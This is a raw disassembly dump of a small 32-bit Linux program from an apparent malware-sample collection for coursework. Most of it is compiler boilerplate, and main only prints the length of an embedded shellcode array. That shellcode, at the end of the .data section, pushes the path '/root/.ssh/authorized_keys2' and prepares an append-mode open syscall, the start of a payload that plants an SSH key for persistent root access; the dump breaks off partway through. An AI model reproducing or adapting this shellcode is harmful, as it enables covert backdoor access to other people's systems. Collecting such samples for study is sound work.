
/home/stas/Coursach/Выборки/compiled/viruses/13330:     формат файла elf32-i386


Дизассемблирование раздела .interp:

08048154 <.interp>:
 8048154:	2f                   	das    
 8048155:	6c                   	insb   (%dx),%es:(%edi)
 8048156:	69 62 2f 6c 64 2d 6c 	imul   $0x6c2d646c,0x2f(%edx),%esp
 804815d:	69 6e 75 78 2e 73 6f 	imul   $0x6f732e78,0x75(%esi),%ebp
 8048164:	2e 32 00             	xor    %cs:(%eax),%al

Дизассемблирование раздела .note.ABI-tag:

08048168 <.note.ABI-tag>:
 8048168:	04 00                	add    $0x0,%al
 804816a:	00 00                	add    %al,(%eax)
 804816c:	10 00                	adc    %al,(%eax)
 804816e:	00 00                	add    %al,(%eax)
 8048170:	01 00                	add    %eax,(%eax)
 8048172:	00 00                	add    %al,(%eax)
 8048174:	47                   	inc    %edi
 8048175:	4e                   	dec    %esi
 8048176:	55                   	push   %ebp
 8048177:	00 00                	add    %al,(%eax)
 8048179:	00 00                	add    %al,(%eax)
 804817b:	00 02                	add    %al,(%edx)
 804817d:	00 00                	add    %al,(%eax)
 804817f:	00 06                	add    %al,(%esi)
 8048181:	00 00                	add    %al,(%eax)
 8048183:	00 18                	add    %bl,(%eax)
 8048185:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .note.gnu.build-id:

08048188 <.note.gnu.build-id>:
 8048188:	04 00                	add    $0x0,%al
 804818a:	00 00                	add    %al,(%eax)
 804818c:	14 00                	adc    $0x0,%al
 804818e:	00 00                	add    %al,(%eax)
 8048190:	03 00                	add    (%eax),%eax
 8048192:	00 00                	add    %al,(%eax)
 8048194:	47                   	inc    %edi
 8048195:	4e                   	dec    %esi
 8048196:	55                   	push   %ebp
 8048197:	00 ac d5 64 cc 5f 29 	add    %ch,0x295fcc64(%ebp,%edx,8)
 804819e:	e4 12                	in     $0x12,%al
 80481a0:	39 fb                	cmp    %edi,%ebx
 80481a2:	82                   	(bad)  
 80481a3:	26                   	es
 80481a4:	37                   	aaa    
 80481a5:	6e                   	outsb  %ds:(%esi),(%dx)
 80481a6:	74 59                	je     8048201 <_init-0xd3>
 80481a8:	b3 57                	mov    $0x57,%bl
 80481aa:	38                   	.byte 0x38
 80481ab:	a4                   	movsb  %ds:(%esi),%es:(%edi)

Дизассемблирование раздела .gnu.hash:

080481ac <.gnu.hash>:
 80481ac:	02 00                	add    (%eax),%al
 80481ae:	00 00                	add    %al,(%eax)
 80481b0:	05 00 00 00 01       	add    $0x1000000,%eax
 80481b5:	00 00                	add    %al,(%eax)
 80481b7:	00 05 00 00 00 00    	add    %al,0x0
 80481bd:	20 00                	and    %al,(%eax)
 80481bf:	20 00                	and    %al,(%eax)
 80481c1:	00 00                	add    %al,(%eax)
 80481c3:	00 05 00 00 00 ad    	add    %al,0xad000000
 80481c9:	4b                   	dec    %ebx
 80481ca:	e3 c0                	jecxz  804818c <_init-0x148>

Дизассемблирование раздела .dynsym:

080481cc <.dynsym>:
	...
 80481dc:	1a 00                	sbb    (%eax),%al
	...
 80481e6:	00 00                	add    %al,(%eax)
 80481e8:	12 00                	adc    (%eax),%al
 80481ea:	00 00                	add    %al,(%eax)
 80481ec:	3a 00                	cmp    (%eax),%al
	...
 80481f6:	00 00                	add    %al,(%eax)
 80481f8:	20 00                	and    %al,(%eax)
 80481fa:	00 00                	add    %al,(%eax)
 80481fc:	21 00                	and    %eax,(%eax)
	...
 8048206:	00 00                	add    %al,(%eax)
 8048208:	12 00                	adc    (%eax),%al
 804820a:	00 00                	add    %al,(%eax)
 804820c:	28 00                	sub    %al,(%eax)
	...
 8048216:	00 00                	add    %al,(%eax)
 8048218:	12 00                	adc    (%eax),%al
 804821a:	00 00                	add    %al,(%eax)
 804821c:	0b 00                	or     (%eax),%eax
 804821e:	00 00                	add    %al,(%eax)
 8048220:	0c 85                	or     $0x85,%al
 8048222:	04 08                	add    $0x8,%al
 8048224:	04 00                	add    $0x0,%al
 8048226:	00 00                	add    %al,(%eax)
 8048228:	11 00                	adc    %eax,(%eax)
 804822a:	0f                   	.byte 0xf
	...

Дизассемблирование раздела .dynstr:

0804822c <.dynstr>:
 804822c:	00 6c 69 62          	add    %ch,0x62(%ecx,%ebp,2)
 8048230:	63 2e                	arpl   %bp,(%esi)
 8048232:	73 6f                	jae    80482a3 <_init-0x31>
 8048234:	2e 36 00 5f 49       	cs add %bl,%cs:%ss:0x49(%edi)
 8048239:	4f                   	dec    %edi
 804823a:	5f                   	pop    %edi
 804823b:	73 74                	jae    80482b1 <_init-0x23>
 804823d:	64 69 6e 5f 75 73 65 	imul   $0x64657375,%fs:0x5f(%esi),%ebp
 8048244:	64 
 8048245:	00 70 72             	add    %dh,0x72(%eax)
 8048248:	69 6e 74 66 00 73 74 	imul   $0x74730066,0x74(%esi),%ebp
 804824f:	72 6c                	jb     80482bd <_init-0x17>
 8048251:	65 6e                	outsb  %gs:(%esi),(%dx)
 8048253:	00 5f 5f             	add    %bl,0x5f(%edi)
 8048256:	6c                   	insb   (%dx),%es:(%edi)
 8048257:	69 62 63 5f 73 74 61 	imul   $0x6174735f,0x63(%edx),%esp
 804825e:	72 74                	jb     80482d4 <_init>
 8048260:	5f                   	pop    %edi
 8048261:	6d                   	insl   (%dx),%es:(%edi)
 8048262:	61                   	popa   
 8048263:	69 6e 00 5f 5f 67 6d 	imul   $0x6d675f5f,0x0(%esi),%ebp
 804826a:	6f                   	outsl  %ds:(%esi),(%dx)
 804826b:	6e                   	outsb  %ds:(%esi),(%dx)
 804826c:	5f                   	pop    %edi
 804826d:	73 74                	jae    80482e3 <_init+0xf>
 804826f:	61                   	popa   
 8048270:	72 74                	jb     80482e6 <_init+0x12>
 8048272:	5f                   	pop    %edi
 8048273:	5f                   	pop    %edi
 8048274:	00 47 4c             	add    %al,0x4c(%edi)
 8048277:	49                   	dec    %ecx
 8048278:	42                   	inc    %edx
 8048279:	43                   	inc    %ebx
 804827a:	5f                   	pop    %edi
 804827b:	32 2e                	xor    (%esi),%ch
 804827d:	30 00                	xor    %al,(%eax)

Дизассемблирование раздела .gnu.version:

08048280 <.gnu.version>:
 8048280:	00 00                	add    %al,(%eax)
 8048282:	02 00                	add    (%eax),%al
 8048284:	00 00                	add    %al,(%eax)
 8048286:	02 00                	add    (%eax),%al
 8048288:	02 00                	add    (%eax),%al
 804828a:	01 00                	add    %eax,(%eax)

Дизассемблирование раздела .gnu.version_r:

0804828c <.gnu.version_r>:
 804828c:	01 00                	add    %eax,(%eax)
 804828e:	01 00                	add    %eax,(%eax)
 8048290:	01 00                	add    %eax,(%eax)
 8048292:	00 00                	add    %al,(%eax)
 8048294:	10 00                	adc    %al,(%eax)
 8048296:	00 00                	add    %al,(%eax)
 8048298:	00 00                	add    %al,(%eax)
 804829a:	00 00                	add    %al,(%eax)
 804829c:	10 69 69             	adc    %ch,0x69(%ecx)
 804829f:	0d 00 00 02 00       	or     $0x20000,%eax
 80482a4:	49                   	dec    %ecx
 80482a5:	00 00                	add    %al,(%eax)
 80482a7:	00 00                	add    %al,(%eax)
 80482a9:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .rel.dyn:

080482ac <.rel.dyn>:
 80482ac:	fc                   	cld    
 80482ad:	9f                   	lahf   
 80482ae:	04 08                	add    $0x8,%al
 80482b0:	06                   	push   %es
 80482b1:	02 00                	add    (%eax),%al
	...

Дизассемблирование раздела .rel.plt:

080482b4 <.rel.plt>:
 80482b4:	0c a0                	or     $0xa0,%al
 80482b6:	04 08                	add    $0x8,%al
 80482b8:	07                   	pop    %es
 80482b9:	01 00                	add    %eax,(%eax)
 80482bb:	00 10                	add    %dl,(%eax)
 80482bd:	a0 04 08 07 02       	mov    0x2070804,%al
 80482c2:	00 00                	add    %al,(%eax)
 80482c4:	14 a0                	adc    $0xa0,%al
 80482c6:	04 08                	add    $0x8,%al
 80482c8:	07                   	pop    %es
 80482c9:	03 00                	add    (%eax),%eax
 80482cb:	00 18                	add    %bl,(%eax)
 80482cd:	a0 04 08 07 04       	mov    0x4070804,%al
	...

Дизассемблирование раздела .init:

080482d4 <_init>:
 80482d4:	53                   	push   %ebx
 80482d5:	83 ec 08             	sub    $0x8,%esp
 80482d8:	e8 a3 00 00 00       	call   8048380 <__x86.get_pc_thunk.bx>
 80482dd:	81 c3 23 1d 00 00    	add    $0x1d23,%ebx
 80482e3:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax
 80482e9:	85 c0                	test   %eax,%eax
 80482eb:	74 05                	je     80482f2 <_init+0x1e>
 80482ed:	e8 2e 00 00 00       	call   8048320 <__gmon_start__@plt>
 80482f2:	83 c4 08             	add    $0x8,%esp
 80482f5:	5b                   	pop    %ebx
 80482f6:	c3                   	ret    

Дизассемблирование раздела .plt:

08048300 <printf@plt-0x10>:
 8048300:	ff 35 04 a0 04 08    	pushl  0x804a004
 8048306:	ff 25 08 a0 04 08    	jmp    *0x804a008
 804830c:	00 00                	add    %al,(%eax)
	...

08048310 <printf@plt>:
 8048310:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 8048316:	68 00 00 00 00       	push   $0x0
 804831b:	e9 e0 ff ff ff       	jmp    8048300 <_init+0x2c>

08048320 <__gmon_start__@plt>:
 8048320:	ff 25 10 a0 04 08    	jmp    *0x804a010
 8048326:	68 08 00 00 00       	push   $0x8
 804832b:	e9 d0 ff ff ff       	jmp    8048300 <_init+0x2c>

08048330 <strlen@plt>:
 8048330:	ff 25 14 a0 04 08    	jmp    *0x804a014
 8048336:	68 10 00 00 00       	push   $0x10
 804833b:	e9 c0 ff ff ff       	jmp    8048300 <_init+0x2c>

08048340 <__libc_start_main@plt>:
 8048340:	ff 25 18 a0 04 08    	jmp    *0x804a018
 8048346:	68 18 00 00 00       	push   $0x18
 804834b:	e9 b0 ff ff ff       	jmp    8048300 <_init+0x2c>

Дизассемблирование раздела .text:

08048350 <_start>:
 8048350:	31 ed                	xor    %ebp,%ebp
 8048352:	5e                   	pop    %esi
 8048353:	89 e1                	mov    %esp,%ecx
 8048355:	83 e4 f0             	and    $0xfffffff0,%esp
 8048358:	50                   	push   %eax
 8048359:	54                   	push   %esp
 804835a:	52                   	push   %edx
 804835b:	68 f0 84 04 08       	push   $0x80484f0
 8048360:	68 80 84 04 08       	push   $0x8048480
 8048365:	51                   	push   %ecx
 8048366:	56                   	push   %esi
 8048367:	68 4d 84 04 08       	push   $0x804844d
 804836c:	e8 cf ff ff ff       	call   8048340 <__libc_start_main@plt>
 8048371:	f4                   	hlt    
 8048372:	66 90                	xchg   %ax,%ax
 8048374:	66 90                	xchg   %ax,%ax
 8048376:	66 90                	xchg   %ax,%ax
 8048378:	66 90                	xchg   %ax,%ax
 804837a:	66 90                	xchg   %ax,%ax
 804837c:	66 90                	xchg   %ax,%ax
 804837e:	66 90                	xchg   %ax,%ax

08048380 <__x86.get_pc_thunk.bx>:
 8048380:	8b 1c 24             	mov    (%esp),%ebx
 8048383:	c3                   	ret    
 8048384:	66 90                	xchg   %ax,%ax
 8048386:	66 90                	xchg   %ax,%ax
 8048388:	66 90                	xchg   %ax,%ax
 804838a:	66 90                	xchg   %ax,%ax
 804838c:	66 90                	xchg   %ax,%ax
 804838e:	66 90                	xchg   %ax,%ax

08048390 <deregister_tm_clones>:
 8048390:	b8 6b a1 04 08       	mov    $0x804a16b,%eax
 8048395:	2d 68 a1 04 08       	sub    $0x804a168,%eax
 804839a:	83 f8 06             	cmp    $0x6,%eax
 804839d:	77 01                	ja     80483a0 <deregister_tm_clones+0x10>
 804839f:	c3                   	ret    
 80483a0:	b8 00 00 00 00       	mov    $0x0,%eax
 80483a5:	85 c0                	test   %eax,%eax
 80483a7:	74 f6                	je     804839f <deregister_tm_clones+0xf>
 80483a9:	55                   	push   %ebp
 80483aa:	89 e5                	mov    %esp,%ebp
 80483ac:	83 ec 18             	sub    $0x18,%esp
 80483af:	c7 04 24 68 a1 04 08 	movl   $0x804a168,(%esp)
 80483b6:	ff d0                	call   *%eax
 80483b8:	c9                   	leave  
 80483b9:	c3                   	ret    
 80483ba:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi

080483c0 <register_tm_clones>:
 80483c0:	b8 68 a1 04 08       	mov    $0x804a168,%eax
 80483c5:	2d 68 a1 04 08       	sub    $0x804a168,%eax
 80483ca:	c1 f8 02             	sar    $0x2,%eax
 80483cd:	89 c2                	mov    %eax,%edx
 80483cf:	c1 ea 1f             	shr    $0x1f,%edx
 80483d2:	01 d0                	add    %edx,%eax
 80483d4:	d1 f8                	sar    %eax
 80483d6:	75 01                	jne    80483d9 <register_tm_clones+0x19>
 80483d8:	c3                   	ret    
 80483d9:	ba 00 00 00 00       	mov    $0x0,%edx
 80483de:	85 d2                	test   %edx,%edx
 80483e0:	74 f6                	je     80483d8 <register_tm_clones+0x18>
 80483e2:	55                   	push   %ebp
 80483e3:	89 e5                	mov    %esp,%ebp
 80483e5:	83 ec 18             	sub    $0x18,%esp
 80483e8:	89 44 24 04          	mov    %eax,0x4(%esp)
 80483ec:	c7 04 24 68 a1 04 08 	movl   $0x804a168,(%esp)
 80483f3:	ff d2                	call   *%edx
 80483f5:	c9                   	leave  
 80483f6:	c3                   	ret    
 80483f7:	89 f6                	mov    %esi,%esi
 80483f9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi

08048400 <__do_global_dtors_aux>:
 8048400:	80 3d 68 a1 04 08 00 	cmpb   $0x0,0x804a168
 8048407:	75 13                	jne    804841c <__do_global_dtors_aux+0x1c>
 8048409:	55                   	push   %ebp
 804840a:	89 e5                	mov    %esp,%ebp
 804840c:	83 ec 08             	sub    $0x8,%esp
 804840f:	e8 7c ff ff ff       	call   8048390 <deregister_tm_clones>
 8048414:	c6 05 68 a1 04 08 01 	movb   $0x1,0x804a168
 804841b:	c9                   	leave  
 804841c:	f3 c3                	repz ret 
 804841e:	66 90                	xchg   %ax,%ax

08048420 <frame_dummy>:
 8048420:	a1 10 9f 04 08       	mov    0x8049f10,%eax
 8048425:	85 c0                	test   %eax,%eax
 8048427:	74 1f                	je     8048448 <frame_dummy+0x28>
 8048429:	b8 00 00 00 00       	mov    $0x0,%eax
 804842e:	85 c0                	test   %eax,%eax
 8048430:	74 16                	je     8048448 <frame_dummy+0x28>
 8048432:	55                   	push   %ebp
 8048433:	89 e5                	mov    %esp,%ebp
 8048435:	83 ec 18             	sub    $0x18,%esp
 8048438:	c7 04 24 10 9f 04 08 	movl   $0x8049f10,(%esp)
 804843f:	ff d0                	call   *%eax
 8048441:	c9                   	leave  
 8048442:	e9 79 ff ff ff       	jmp    80483c0 <register_tm_clones>
 8048447:	90                   	nop
 8048448:	e9 73 ff ff ff       	jmp    80483c0 <register_tm_clones>

0804844d <main>:
 804844d:	55                   	push   %ebp
 804844e:	89 e5                	mov    %esp,%ebp
 8048450:	83 e4 f0             	and    $0xfffffff0,%esp
 8048453:	83 ec 10             	sub    $0x10,%esp
 8048456:	c7 04 24 40 a0 04 08 	movl   $0x804a040,(%esp)
 804845d:	e8 ce fe ff ff       	call   8048330 <strlen@plt>
 8048462:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048466:	c7 04 24 10 85 04 08 	movl   $0x8048510,(%esp)
 804846d:	e8 9e fe ff ff       	call   8048310 <printf@plt>
 8048472:	c9                   	leave  
 8048473:	c3                   	ret    
 8048474:	66 90                	xchg   %ax,%ax
 8048476:	66 90                	xchg   %ax,%ax
 8048478:	66 90                	xchg   %ax,%ax
 804847a:	66 90                	xchg   %ax,%ax
 804847c:	66 90                	xchg   %ax,%ax
 804847e:	66 90                	xchg   %ax,%ax

08048480 <__libc_csu_init>:
 8048480:	55                   	push   %ebp
 8048481:	57                   	push   %edi
 8048482:	31 ff                	xor    %edi,%edi
 8048484:	56                   	push   %esi
 8048485:	53                   	push   %ebx
 8048486:	e8 f5 fe ff ff       	call   8048380 <__x86.get_pc_thunk.bx>
 804848b:	81 c3 75 1b 00 00    	add    $0x1b75,%ebx
 8048491:	83 ec 1c             	sub    $0x1c,%esp
 8048494:	8b 6c 24 30          	mov    0x30(%esp),%ebp
 8048498:	8d b3 0c ff ff ff    	lea    -0xf4(%ebx),%esi
 804849e:	e8 31 fe ff ff       	call   80482d4 <_init>
 80484a3:	8d 83 08 ff ff ff    	lea    -0xf8(%ebx),%eax
 80484a9:	29 c6                	sub    %eax,%esi
 80484ab:	c1 fe 02             	sar    $0x2,%esi
 80484ae:	85 f6                	test   %esi,%esi
 80484b0:	74 27                	je     80484d9 <__libc_csu_init+0x59>
 80484b2:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
 80484b8:	8b 44 24 38          	mov    0x38(%esp),%eax
 80484bc:	89 2c 24             	mov    %ebp,(%esp)
 80484bf:	89 44 24 08          	mov    %eax,0x8(%esp)
 80484c3:	8b 44 24 34          	mov    0x34(%esp),%eax
 80484c7:	89 44 24 04          	mov    %eax,0x4(%esp)
 80484cb:	ff 94 bb 08 ff ff ff 	call   *-0xf8(%ebx,%edi,4)
 80484d2:	83 c7 01             	add    $0x1,%edi
 80484d5:	39 f7                	cmp    %esi,%edi
 80484d7:	75 df                	jne    80484b8 <__libc_csu_init+0x38>
 80484d9:	83 c4 1c             	add    $0x1c,%esp
 80484dc:	5b                   	pop    %ebx
 80484dd:	5e                   	pop    %esi
 80484de:	5f                   	pop    %edi
 80484df:	5d                   	pop    %ebp
 80484e0:	c3                   	ret    
 80484e1:	eb 0d                	jmp    80484f0 <__libc_csu_fini>
 80484e3:	90                   	nop
 80484e4:	90                   	nop
 80484e5:	90                   	nop
 80484e6:	90                   	nop
 80484e7:	90                   	nop
 80484e8:	90                   	nop
 80484e9:	90                   	nop
 80484ea:	90                   	nop
 80484eb:	90                   	nop
 80484ec:	90                   	nop
 80484ed:	90                   	nop
 80484ee:	90                   	nop
 80484ef:	90                   	nop

080484f0 <__libc_csu_fini>:
 80484f0:	f3 c3                	repz ret 

Дизассемблирование раздела .fini:

080484f4 <_fini>:
 80484f4:	53                   	push   %ebx
 80484f5:	83 ec 08             	sub    $0x8,%esp
 80484f8:	e8 83 fe ff ff       	call   8048380 <__x86.get_pc_thunk.bx>
 80484fd:	81 c3 03 1b 00 00    	add    $0x1b03,%ebx
 8048503:	83 c4 08             	add    $0x8,%esp
 8048506:	5b                   	pop    %ebx
 8048507:	c3                   	ret    

Дизассемблирование раздела .rodata:

08048508 <_fp_hw>:
 8048508:	03 00                	add    (%eax),%eax
	...

0804850c <_IO_stdin_used>:
 804850c:	01 00                	add    %eax,(%eax)
 804850e:	02 00                	add    (%eax),%al
 8048510:	25 64 20 62 79       	and    $0x79622064,%eax
 8048515:	74 65                	je     804857c <_IO_stdin_used+0x70>
 8048517:	73 0a                	jae    8048523 <_IO_stdin_used+0x17>
	...

Дизассемблирование раздела .eh_frame_hdr:

0804851c <.eh_frame_hdr>:
 804851c:	01 1b                	add    %ebx,(%ebx)
 804851e:	03 3b                	add    (%ebx),%edi
 8048520:	28 00                	sub    %al,(%eax)
 8048522:	00 00                	add    %al,(%eax)
 8048524:	04 00                	add    $0x0,%al
 8048526:	00 00                	add    %al,(%eax)
 8048528:	e4 fd                	in     $0xfd,%al
 804852a:	ff                   	(bad)  
 804852b:	ff 44 00 00          	incl   0x0(%eax,%eax,1)
 804852f:	00 31                	add    %dh,(%ecx)
 8048531:	ff                   	(bad)  
 8048532:	ff                   	(bad)  
 8048533:	ff 68 00             	ljmp   *0x0(%eax)
 8048536:	00 00                	add    %al,(%eax)
 8048538:	64                   	fs
 8048539:	ff                   	(bad)  
 804853a:	ff                   	(bad)  
 804853b:	ff 88 00 00 00 d4    	decl   -0x2c000000(%eax)
 8048541:	ff                   	(bad)  
 8048542:	ff                   	(bad)  
 8048543:	ff c4                	inc    %esp
 8048545:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .eh_frame:

08048548 <__FRAME_END__-0xac>:
 8048548:	14 00                	adc    $0x0,%al
 804854a:	00 00                	add    %al,(%eax)
 804854c:	00 00                	add    %al,(%eax)
 804854e:	00 00                	add    %al,(%eax)
 8048550:	01 7a 52             	add    %edi,0x52(%edx)
 8048553:	00 01                	add    %al,(%ecx)
 8048555:	7c 08                	jl     804855f <_IO_stdin_used+0x53>
 8048557:	01 1b                	add    %ebx,(%ebx)
 8048559:	0c 04                	or     $0x4,%al
 804855b:	04 88                	add    $0x88,%al
 804855d:	01 00                	add    %eax,(%eax)
 804855f:	00 20                	add    %ah,(%eax)
 8048561:	00 00                	add    %al,(%eax)
 8048563:	00 1c 00             	add    %bl,(%eax,%eax,1)
 8048566:	00 00                	add    %al,(%eax)
 8048568:	98                   	cwtl   
 8048569:	fd                   	std    
 804856a:	ff                   	(bad)  
 804856b:	ff 50 00             	call   *0x0(%eax)
 804856e:	00 00                	add    %al,(%eax)
 8048570:	00 0e                	add    %cl,(%esi)
 8048572:	08 46 0e             	or     %al,0xe(%esi)
 8048575:	0c 4a                	or     $0x4a,%al
 8048577:	0f 0b                	ud2    
 8048579:	74 04                	je     804857f <_IO_stdin_used+0x73>
 804857b:	78 00                	js     804857d <_IO_stdin_used+0x71>
 804857d:	3f                   	aas    
 804857e:	1a 3b                	sbb    (%ebx),%bh
 8048580:	2a 32                	sub    (%edx),%dh
 8048582:	24 22                	and    $0x22,%al
 8048584:	1c 00                	sbb    $0x0,%al
 8048586:	00 00                	add    %al,(%eax)
 8048588:	40                   	inc    %eax
 8048589:	00 00                	add    %al,(%eax)
 804858b:	00 c1                	add    %al,%cl
 804858d:	fe                   	(bad)  
 804858e:	ff                   	(bad)  
 804858f:	ff 27                	jmp    *(%edi)
 8048591:	00 00                	add    %al,(%eax)
 8048593:	00 00                	add    %al,(%eax)
 8048595:	41                   	inc    %ecx
 8048596:	0e                   	push   %cs
 8048597:	08 85 02 42 0d 05    	or     %al,0x50d4202(%ebp)
 804859d:	63 c5                	arpl   %ax,%bp
 804859f:	0c 04                	or     $0x4,%al
 80485a1:	04 00                	add    $0x0,%al
 80485a3:	00 38                	add    %bh,(%eax)
 80485a5:	00 00                	add    %al,(%eax)
 80485a7:	00 60 00             	add    %ah,0x0(%eax)
 80485aa:	00 00                	add    %al,(%eax)
 80485ac:	d4 fe                	aam    $0xfe
 80485ae:	ff                   	(bad)  
 80485af:	ff 61 00             	jmp    *0x0(%ecx)
 80485b2:	00 00                	add    %al,(%eax)
 80485b4:	00 41 0e             	add    %al,0xe(%ecx)
 80485b7:	08 85 02 41 0e 0c    	or     %al,0xc0e4102(%ebp)
 80485bd:	87 03                	xchg   %eax,(%ebx)
 80485bf:	43                   	inc    %ebx
 80485c0:	0e                   	push   %cs
 80485c1:	10 86 04 41 0e 14    	adc    %al,0x140e4104(%esi)
 80485c7:	83 05 4e 0e 30 02 48 	addl   $0x48,0x2300e4e
 80485ce:	0e                   	push   %cs
 80485cf:	14 41                	adc    $0x41,%al
 80485d1:	c3                   	ret    
 80485d2:	0e                   	push   %cs
 80485d3:	10 41 c6             	adc    %al,-0x3a(%ecx)
 80485d6:	0e                   	push   %cs
 80485d7:	0c 41                	or     $0x41,%al
 80485d9:	c7                   	(bad)  
 80485da:	0e                   	push   %cs
 80485db:	08 41 c5             	or     %al,-0x3b(%ecx)
 80485de:	0e                   	push   %cs
 80485df:	04 10                	add    $0x10,%al
 80485e1:	00 00                	add    %al,(%eax)
 80485e3:	00 9c 00 00 00 08 ff 	add    %bl,-0xf80000(%eax,%eax,1)
 80485ea:	ff                   	(bad)  
 80485eb:	ff 02                	incl   (%edx)
 80485ed:	00 00                	add    %al,(%eax)
 80485ef:	00 00                	add    %al,(%eax)
 80485f1:	00 00                	add    %al,(%eax)
	...

080485f4 <__FRAME_END__>:
 80485f4:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .init_array:

08049f08 <__frame_dummy_init_array_entry>:
 8049f08:	20                   	.byte 0x20
 8049f09:	84 04 08             	test   %al,(%eax,%ecx,1)

Дизассемблирование раздела .fini_array:

08049f0c <__do_global_dtors_aux_fini_array_entry>:
 8049f0c:	00                   	.byte 0x0
 8049f0d:	84 04 08             	test   %al,(%eax,%ecx,1)

Дизассемблирование раздела .jcr:

08049f10 <__JCR_END__>:
 8049f10:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .dynamic:

08049f14 <_DYNAMIC>:
 8049f14:	01 00                	add    %eax,(%eax)
 8049f16:	00 00                	add    %al,(%eax)
 8049f18:	01 00                	add    %eax,(%eax)
 8049f1a:	00 00                	add    %al,(%eax)
 8049f1c:	0c 00                	or     $0x0,%al
 8049f1e:	00 00                	add    %al,(%eax)
 8049f20:	d4 82                	aam    $0x82
 8049f22:	04 08                	add    $0x8,%al
 8049f24:	0d 00 00 00 f4       	or     $0xf4000000,%eax
 8049f29:	84 04 08             	test   %al,(%eax,%ecx,1)
 8049f2c:	19 00                	sbb    %eax,(%eax)
 8049f2e:	00 00                	add    %al,(%eax)
 8049f30:	08 9f 04 08 1b 00    	or     %bl,0x1b0804(%edi)
 8049f36:	00 00                	add    %al,(%eax)
 8049f38:	04 00                	add    $0x0,%al
 8049f3a:	00 00                	add    %al,(%eax)
 8049f3c:	1a 00                	sbb    (%eax),%al
 8049f3e:	00 00                	add    %al,(%eax)
 8049f40:	0c 9f                	or     $0x9f,%al
 8049f42:	04 08                	add    $0x8,%al
 8049f44:	1c 00                	sbb    $0x0,%al
 8049f46:	00 00                	add    %al,(%eax)
 8049f48:	04 00                	add    $0x0,%al
 8049f4a:	00 00                	add    %al,(%eax)
 8049f4c:	f5                   	cmc    
 8049f4d:	fe                   	(bad)  
 8049f4e:	ff 6f ac             	ljmp   *-0x54(%edi)
 8049f51:	81 04 08 05 00 00 00 	addl   $0x5,(%eax,%ecx,1)
 8049f58:	2c 82                	sub    $0x82,%al
 8049f5a:	04 08                	add    $0x8,%al
 8049f5c:	06                   	push   %es
 8049f5d:	00 00                	add    %al,(%eax)
 8049f5f:	00 cc                	add    %cl,%ah
 8049f61:	81 04 08 0a 00 00 00 	addl   $0xa,(%eax,%ecx,1)
 8049f68:	53                   	push   %ebx
 8049f69:	00 00                	add    %al,(%eax)
 8049f6b:	00 0b                	add    %cl,(%ebx)
 8049f6d:	00 00                	add    %al,(%eax)
 8049f6f:	00 10                	add    %dl,(%eax)
 8049f71:	00 00                	add    %al,(%eax)
 8049f73:	00 15 00 00 00 00    	add    %dl,0x0
 8049f79:	00 00                	add    %al,(%eax)
 8049f7b:	00 03                	add    %al,(%ebx)
 8049f7d:	00 00                	add    %al,(%eax)
 8049f7f:	00 00                	add    %al,(%eax)
 8049f81:	a0 04 08 02 00       	mov    0x20804,%al
 8049f86:	00 00                	add    %al,(%eax)
 8049f88:	20 00                	and    %al,(%eax)
 8049f8a:	00 00                	add    %al,(%eax)
 8049f8c:	14 00                	adc    $0x0,%al
 8049f8e:	00 00                	add    %al,(%eax)
 8049f90:	11 00                	adc    %eax,(%eax)
 8049f92:	00 00                	add    %al,(%eax)
 8049f94:	17                   	pop    %ss
 8049f95:	00 00                	add    %al,(%eax)
 8049f97:	00 b4 82 04 08 11 00 	add    %dh,0x110804(%edx,%eax,4)
 8049f9e:	00 00                	add    %al,(%eax)
 8049fa0:	ac                   	lods   %ds:(%esi),%al
 8049fa1:	82                   	(bad)  
 8049fa2:	04 08                	add    $0x8,%al
 8049fa4:	12 00                	adc    (%eax),%al
 8049fa6:	00 00                	add    %al,(%eax)
 8049fa8:	08 00                	or     %al,(%eax)
 8049faa:	00 00                	add    %al,(%eax)
 8049fac:	13 00                	adc    (%eax),%eax
 8049fae:	00 00                	add    %al,(%eax)
 8049fb0:	08 00                	or     %al,(%eax)
 8049fb2:	00 00                	add    %al,(%eax)
 8049fb4:	fe                   	(bad)  
 8049fb5:	ff                   	(bad)  
 8049fb6:	ff 6f 8c             	ljmp   *-0x74(%edi)
 8049fb9:	82                   	(bad)  
 8049fba:	04 08                	add    $0x8,%al
 8049fbc:	ff                   	(bad)  
 8049fbd:	ff                   	(bad)  
 8049fbe:	ff 6f 01             	ljmp   *0x1(%edi)
 8049fc1:	00 00                	add    %al,(%eax)
 8049fc3:	00 f0                	add    %dh,%al
 8049fc5:	ff                   	(bad)  
 8049fc6:	ff 6f 80             	ljmp   *-0x80(%edi)
 8049fc9:	82                   	(bad)  
 8049fca:	04 08                	add    $0x8,%al
	...

Дизассемблирование раздела .got:

08049ffc <.got>:
 8049ffc:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .got.plt:

0804a000 <_GLOBAL_OFFSET_TABLE_>:
 804a000:	14 9f                	adc    $0x9f,%al
 804a002:	04 08                	add    $0x8,%al
	...
 804a00c:	16                   	push   %ss
 804a00d:	83 04 08 26          	addl   $0x26,(%eax,%ecx,1)
 804a011:	83 04 08 36          	addl   $0x36,(%eax,%ecx,1)
 804a015:	83 04 08 46          	addl   $0x46,(%eax,%ecx,1)
 804a019:	83                   	.byte 0x83
 804a01a:	04 08                	add    $0x8,%al

Дизассемблирование раздела .data:

0804a020 <__data_start>:
 804a020:	00 00                	add    %al,(%eax)
	...

0804a024 <__dso_handle>:
	...

0804a040 <sc>:
 804a040:	31 d2                	xor    %edx,%edx
 804a042:	52                   	push   %edx
 804a043:	68 65 79 73 32       	push   $0x32737965
 804a048:	68 65 64 5f 6b       	push   $0x6b5f6465
 804a04d:	68 6f 72 69 7a       	push   $0x7a69726f
 804a052:	68 61 75 74 68       	push   $0x68747561
 804a057:	68 73 73 68 2f       	push   $0x2f687373
 804a05c:	68 74 2f 2f 2e       	push   $0x2e2f2f74
 804a061:	68 2f 72 6f 6f       	push   $0x6f6f722f
 804a066:	89 e3                	mov    %esp,%ebx
 804a068:	66 b9 41 04          	mov    $0x441,%cx
 804a06c:	6a 05                	push   $0x5
